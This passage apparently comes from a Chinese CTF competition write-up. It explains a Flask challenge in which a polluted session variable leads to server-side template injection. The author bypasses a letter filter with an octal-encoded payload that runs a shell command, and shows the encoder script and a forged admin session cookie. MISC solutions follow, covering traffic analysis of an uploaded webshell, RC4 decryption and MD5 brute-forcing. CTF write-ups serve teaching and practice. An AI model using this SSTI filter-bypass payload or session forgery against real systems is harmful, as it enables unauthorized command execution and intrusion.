    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">'admin.html'</span><span class="p">,</span> <span class="n">view</span><span class="o">=</span><span class="s1">'index'</span><span class="p">)</span>
</pre></div>
<p>并发现存在ssti漏洞</p>
<div class="highlight"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/admin/view_inventory'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">'GET'</span><span class="p">,</span> <span class="s1">'POST'</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">view_inventory</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'username'</span><span class="p">)</span>
    <span class="n">identity</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">'identity'</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">username</span> <span class="ow">or</span> <span class="n">identity</span> <span class="o">!=</span> <span class="s1">'admin'</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">'register'</span><span class="p">))</span>
    <span class="n">inventory_value</span> <span class="o">=</span> <span class="n">sanitize_inventory_sold</span><span class="p">(</span><span class="n">inventory</span><span class="p">)</span>
    <span class="n">sold_value</span> <span class="o">=</span> <span class="n">sanitize_inventory_sold</span><span class="p">(</span><span class="n">sold</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="s2">"商店库存:"</span> <span class="o">+</span> <span class="n">inventory_value</span> <span class="o">+</span> <span class="s2">"已售出"</span> <span class="o">+</span> <span class="n">sold_value</span><span class="p">)</span>
</pre></div>
<p>结合原型链污染，我们可以污染全局变量<code>inventory</code>来造成ssti</p>
<div class="highlight"><pre><span></span><span class="p">{</span><span class="s">"__init__"</span><span class="o">:</span><span class="p">{</span><span class="s">"__globals__"</span><span class="o">:</span><span class="p">{</span><span class="s">"inventory"</span><span class="o">:</span><span class="s">"{{7*7}}"</span><span class="p">}}</span>
</pre></div>
<p>但是源码过滤了字母和下划线</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">sanitize_inventory_sold</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">'[a-zA-Z_]'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">))</span>
</pre></div>
<p>尽管禁用了字母但还可以用八进制绕过！<br/>
使用脚本伪造payload</p>
<div class="highlight"><pre><span></span><span class="nb">input</span> <span class="o">=</span> <span class="s2">"cat /tmp/9fb871d06639d7665f8c2005f87200fe/e586231aabe38cf5befd176a1ff25fec/6a5d614cfdcd840afead8e3497595126/flag"</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">'"</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>

<span class="k">for</span> <span class="n">letter</span> <span class="ow">in</span> <span class="nb">input</span><span class="p">:</span>

    <span class="c1">#print(hex(ord(letter)).replace("0x", r"\x"), end="")</span>

    <span class="c1">#print(hex(ord(letter)).replace("0x", r"\u00"), end="")</span>

    <span class="k">print</span><span class="p">(</span><span class="nb">oct</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">letter</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">"0o"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\\\\</span><span class="s2">"</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">'"</span><span class="p">)</span>

<span class="c1">#python flask_session_cookie_manager3.py encode -s a123456 -t "{'csrf_token':'d1df86bef71f636528afbc74473b66673eda4720','identity':'admin','username':'admin','__init__':{'__globals__':{'inventory':'{{\'\'[\'\\137\\137\\143\\154\\141\\163\\163\\137\\137\'][\'\\137\\137\\155\\162\\157\\137\\137\'][1][\'\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\']()[132][\'\\137\\137\\151\\156\\151\\164\\137\\137\'][\'\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\'][\'\\160\\157\\160\\145\\156\'](\'\\143\\141\\164\\40\\57\\164\\155\\160\\57\\71\\146\\142\\70\\67\\61\\144\\60\\66\\66\\63\\71\\144\\67\\66\\66\\65\\146\\70\\143\\62\\60\\60\\65\\146\\70\\67\\62\\60\\60\\146\\145\\57\\145\\65\\70\\66\\62\\63\\61\\141\\141\\142\\145\\63\\70\\143\\146\\65\\142\\145\\146\\144\\61\\67\\66\\141\\61\\146\\146\\62\\65\\146\\145\\143\\57\\66\\141\\65\\144\\66\\61\\64\\143\\146\\144\\143\\144\\70\\64\\60\\141\\146\\145\\141\\144\\70\\145\\63\\64\\71\\67\\65\\71\\65\\61\\62\\66\\57\\146\\154\\141\\147\')[\'\\162\\145\\141\\144\']()}}'}}}"</span>



<span class="c1">#{{''['\\137\\137\\143\\154\\141\\163\\163\\137\\137']}}</span>

<span class="c1"># __class__；\'\\137\\137\\143\\154\\141\\163\\163\\137\\137\'</span>

<span class="c1"># __mro__:\'\\137\\137\\155\\162\\157\\137\\137\'</span>

<span class="c1"># __base__: \'\\137\\137\\142\\141\\163\\145\\163\\137\\137\'</span>

<span class="c1">#__subclasses__:\'\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\'  [132]</span>

<span class="c1">#__init__:\'\\137\\137\\151\\156\\151\\164\\137\\137\'</span>

<span class="c1">#__globals__:\'\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\'</span>

<span class="c1">#popen: \'\\160\\157\\160\\145\\156\'</span>

<span class="c1"># cat /f*;\'\\143\\141\\164\\40\\57\\146\\52\'</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="mi">86150</span>\<span class="n">Desktop</span>\<span class="n">flask</span><span class="o">-</span><span class="n">session</span><span class="o">-</span><span class="n">cookie</span><span class="o">-</span><span class="n">manager</span><span class="o">-</span><span class="mf">1.2</span><span class="o">.</span><span class="mf">1.1</span><span class="o">&gt;</span> <span class="n">python</span> <span class="n">flask_session_cookie_manager3</span><span class="o">.</span><span class="n">py</span> <span class="n">encode</span> <span class="o">-</span><span class="n">s</span> <span class="n">a123456</span> <span class="o">-</span><span class="n">t</span> <span class="s2">"{'csrf_token':'d1df86bef71f636528afbc74473b66673eda4720','identity':'admin','username':'admin','__init__':{'__globals__':{'inventory':'{{</span><span class="se">\'\'</span><span class="s2">[</span><span class="se">\'\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">154</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\'</span><span class="s2">][</span><span class="se">\'\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">155</span><span class="se">\\</span><span class="s2">162</span><span class="se">\\</span><span class="s2">157</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\'</span><span class="s2">][1][</span><span class="se">\'\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">165</span><span class="se">\\</span><span class="s2">142</span><span class="se">\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">154</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\'</span><span class="s2">]()[132][</span><span class="se">\'\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">151</span><span class="se">\\</span><span class="s2">156</span><span class="se">\\</span><span class="s2">151</span><span class="se">\\</span><span class="s2">164</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\'</span><span class="s2">][</span><span class="se">\'\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">147</span><span class="se">\\</span><span class="s2">154</span><span class="se">\\</span><span class="s2">157</span><span class="se">\\</span><span class="s2">142</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">154</span><span class="se">\\</span><span class="s2">163</span><span class="se">\\</span><span class="s2">137</span><span class="se">\\</span><span class="s2">137</span><span class="se">\'</span><span class="s2">][</span><span class="se">\'\\</span><span class="s2">160</span><span class="se">\\</span><span class="s2">157</span><span class="se">\\</span><span class="s2">160</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">156</span><span class="se">\'</span><span class="s2">](</span><span class="se">\'\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">164</span><span class="se">\\</span><span class="s2">40</span><span class="se">\\</span><span class="s2">57</span><span class="se">\\</span><span class="s2">164</span><span class="se">\\</span><span class="s2">155</span><span class="se">\\</span><span class="s2">160</span><span class="se">\\</span><span class="s2">57</span><span class="se">\\</span><span class="s2">71</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">142</span><span class="se">\\</span><span class="s2">70</span><span class="se">\\</span><span class="s2">67</span><span class="se">\\</span><span class="s2">61</span><span class="se">\\</span><span class="s2">144</span><span class="se">\\</span><span class="s2">60</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">63</span><span class="se">\\</span><span class="s2">71</span><span class="se">\\</span><span class="s2">144</span><span class="se">\\</span><span class="s2">67</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">65</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">70</span><span class="se">\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">62</span><span class="se">\\</span><span class="s2">60</span><span class="se">\\</span><span class="s2">60</span><span class="se">\\</span><span class="s2">65</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">70</span><span class="se">\\</span><span class="s2">67</span><span class="se">\\</span><span class="s2">62</span><span class="se">\\</span><span class="s2">60</span><span class="se">\\</span><span class="s2">60</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">57</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">65</span><span class="se">\\</span><span class="s2">70</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">62</span><span class="se">\\</span><span class="s2">63</span><span class="se">\\</span><span class="s2">61</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">142</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">63</span><span class="se">\\</span><span class="s2">70</span><span class="se">\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">65</span><span class="se">\\</span><span class="s2">142</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">144</span><span class="se">\\</span><span class="s2">61</span><span class="se">\\</span><span class="s2">67</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">61</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">62</span><span class="se">\\</span><span class="s2">65</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">57</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">65</span><span class="se">\\</span><span class="s2">144</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">61</span><span class="se">\\</span><span class="s2">64</span><span class="se">\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">144</span><span class="se">\\</span><span class="s2">143</span><span class="se">\\</span><span class="s2">144</span><span class="se">\\</span><span class="s2">70</span><span class="se">\\</span><span class="s2">64</span><span class="se">\\</span><span class="s2">60</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">144</span><span class="se">\\</span><span class="s2">70</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">63</span><span class="se">\\</span><span class="s2">64</span><span class="se">\\</span><span class="s2">71</span><span class="se">\\</span><span class="s2">67</span><span class="se">\\</span><span class="s2">65</span><span class="se">\\</span><span class="s2">71</span><span class="se">\\</span><span class="s2">65</span><span class="se">\\</span><span class="s2">61</span><span class="se">\\</span><span class="s2">62</span><span class="se">\\</span><span class="s2">66</span><span class="se">\\</span><span class="s2">57</span><span class="se">\\</span><span class="s2">146</span><span class="se">\\</span><span class="s2">154</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">147</span><span class="se">\'</span><span class="s2">)[</span><span class="se">\'\\</span><span class="s2">162</span><span class="se">\\</span><span class="s2">145</span><span class="se">\\</span><span class="s2">141</span><span class="se">\\</span><span class="s2">144</span><span class="se">\'</span><span class="s2">]()}}'}}}"</span>

<span class="o">.</span><span class="n">eJx9UttugzAM_RdeWKU9kMR2qv5KOyEoMKG1VGrZpAnx78vFbgOd</span><span class="o">-</span><span class="n">oDl2MfnHIdM2fF27crx8tUO2S5rVNNtqW47qzoyhHpbdfXRAlhTE5E1bVOB1UX2nvVNO4z9</span><span class="o">-</span><span class="n">OumqubcD670fWuvQ3Vuk1JZ9kM_lmW2m1z</span><span class="o">-</span><span class="n">ebrU1ekWj_3w4xguV88wTXm</span><span class="o">-</span><span class="n">zw8HZawEMC4g</span><span class="o">-</span><span class="n">Ey5QEYCQ_KP1QCiR2if2QVMrZGRy8NBv1ICfNJ82</span><span class="o">-</span><span class="n">yV0U_Sfg5JMoIXNsGKWrAZHSip_bMhFYINWTCF5Kzk4h1EFBwgIuF</span><span class="o">-</span><span class="n">IVyyHgPEitZVyVUpVB3Yw4j4MwIHRkkDmcMWLO2vO4wWq24YS5osjezPJx5vRVZH2ejnEbRgTSIauJLfh3d6iAziOZDQY3ERwtRPoMTFBAoXMR</span><span class="o">-</span><span class="n">kyqHFR</span><span class="o">-</span><span class="n">AVQLZUS2qVgO6LeLQVm8g5spSOsvGWaPEwweab</span><span class="o">-</span><span class="n">CL0SsC_y3nO5nn</span><span class="o">-</span><span class="n">A</span><span class="o">-</span><span class="n">EVDjQ</span><span class="o">.</span><span class="n">Zt1CFQ</span><span class="o">.</span><span class="n">mbfc47fCCO</span><span class="o">-</span><span class="n">papkcsSiUKBJXNaI</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908144841-62870d4c-6dae-1.png"/></p>
<h1 data-content="1" id="97fdbc4692c997787b87ae07eaebbe14">MISC</h1>
<h2 data-content="1" id="80d063fdec30b42953049b53b94b1ce9">BrickGame</h2>
<p>修改一下js，跳过匹配的验证即可得到flag<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908150153-3a7697e4-6db0-1.png"/></p>
<h2 data-content="1" id="4b30c708e2fa959bacf6a5e8acf56114">漏洞探踪，流量解密</h2>
<p>第一阶段发现上传了图片马，并通过访问gateway传参执行了命令</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908150823-22cc836e-6db1-1.png"/><br/>
,尝试多个ip后使用192.168.30.234 成功解开压缩包<br/>
分析第二个流量包，发现使用命令从192.168.1.5 下载了raw和key</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908151916-a7ea5174-6db2-1.png"/><br/>
得到了加密的flag和key后，在后续流量包提示加密为RC4：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908151931-b13aad82-6db2-1.png"/></p>
<p>解密得到flag</p>
<pre><code>from Crypto.Cipher import ARC4
raw = bytes.fromhex("5a76f6751576dbe1af49328aa1d2d2bea16ef62afa3a7c616d")
key = bytes.fromhex("bdb8e21eace81d5fd21ca445ccb35071")
cipher = ARC4.new(key)
plaintext = cipher.decrypt(raw)</code></pre>
<h2 data-content="1" id="02138833eff21e7752befbda57dcd683">最安全的加密方式</h2>
<p>flag: flag{The_m0st_2ecUre_eNcrYption!!!}<br/>
流量包一开始有很多数据库的流量，未知<br/>
直接筛选http协议，发现有三个post请求，一个上传了php文件，一个上传了图片，一个上传了压缩包</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908152019-cdf9cd0e-6db2-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240908152028-d2eb55e4-6db2-1.png"/></p>
<p>使用php脚本中的pass可以打开压缩包，发现文本文件flag.txt<br/>
貌似是单个字符的md5，直接爆破：</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span> <span class="k">as</span> <span class="nb">all</span>

<span class="n">charset</span> <span class="o">=</span> <span class="nb">all</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"flag.txt"</span><span class="p">,</span> <span class="s2">"r"</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>

<span class="n">md5s</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
    <span class="n">md5s</span><span class="p">[</span><span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">i</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()]</span> <span class="o">=</span> <span class="n">i</span>

<span class="k">print</span><span class="p">(</span><span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">md5s</span><span class="p">[</span><span class="n">i</span><span class="o">.</span><span class="n">strip</span><span class="p">()]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">data</span><span class="p">]))</span>
</pre></div>
</div>
</div>